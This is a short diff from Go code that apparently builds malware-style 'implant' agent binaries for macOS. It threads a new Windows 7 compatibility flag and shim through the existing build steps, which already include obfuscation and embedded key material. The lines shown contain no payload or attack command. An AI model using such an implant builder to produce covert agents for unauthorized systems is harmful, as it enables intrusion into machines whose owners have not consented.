 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
+	}
+	if cfg.Win7Compat {
+		if err := materializeWin7Shim(tmpDir); err != nil {
+			return "", err
+		}
 	}
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "darwin")
@@ -2045,14 +2461,14 @@ func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
 	if goCmd == "" {
 		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
 	}
-	if err := runGoModTidy(goCmd, tmpDir); err != nil {
+	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 	goarch, err := resolveBuildArch("darwin", cfg.Architecture)
 	if err != nil {
 		return "", err
 	}
-	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "darwin", goarch, blob, sKey); err != nil {
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "darwin", goarch, blob, sKey, cfg.Win7Compat); err != nil {
 		return "", err
 	}
 
